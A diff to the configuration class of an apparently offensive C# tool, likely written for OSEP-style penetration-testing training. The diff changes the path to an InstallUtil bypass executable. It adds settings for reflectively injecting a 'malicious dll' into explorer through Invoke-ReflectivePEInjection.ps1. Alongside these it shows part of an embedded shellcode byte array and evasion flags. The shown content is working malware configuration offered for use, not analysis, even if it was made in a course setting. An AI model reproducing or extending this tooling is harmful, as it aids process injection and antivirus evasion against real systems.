@@ -12,7 +12,7 @@ public static class CONFIG
     public static string POWERSHELL_SCRIPT_NAME = "exploit.ps1";
     public static string WAIT_TIME_SECONDS = "2";
 
-    public static string INSTALL_UTIL_EXE_PATH = @"C:\Bill\bypass.exe";
+    public static string INSTALL_UTIL_EXE_PATH = @"C:\Users\warum\source\repos\OSEP_2026\EXE InstallUtil Callback Test\bin\Debug\result.exe";
 
     //Evasion
     public static bool ENCODED = false;
@@ -59,6 +59,24 @@ public static class CONFIG
 0x53,0x9b,0x79,0x13,0x4d,0x50,0x1d,0x3e,0x5f,0xcb,0x46,0x02,0x18,0xe7,0xa2,0xd9,0x1a,0x2b,0x68,0xb3,
 0x04,0x48,0x58,0xcd,0xca,0xfd,0x69,0xe4,0xe8,0xc0,0xaf,0x40,0xf2,0xb8,0x42,0x57,0xe8,0x4d,0x84,0x44,
 0x8d,0xff,0xd5,0x86,0x40,0x81,0xf6,0xed,0xf6,0x46,0x21};
+
+
+
+
+    //Invoke Reflection Options
+    public static string INVOKEREF_HOSTED_DLL_NAME = "invref_callback.dll"; //The name of the malicious dll we want to invoke.
+    public static string INVOKEREF_HOSTED_SCRIPT_NAME = "Invoke-ReflectivePEInjection.ps1"; //The name of the PS Script to facilitate injection
+    public static string INVOKEREF_TARGET_PROCESS = "explorer";//Name of the process we want to inject into
+    public static string INVOKEREF_VARNAMEA = "bytes"; //variable names
+    public static string INVOKEREF_VARNAMEB = "procid"; 
+
+
+
+
+
+
+
+
 
 
 
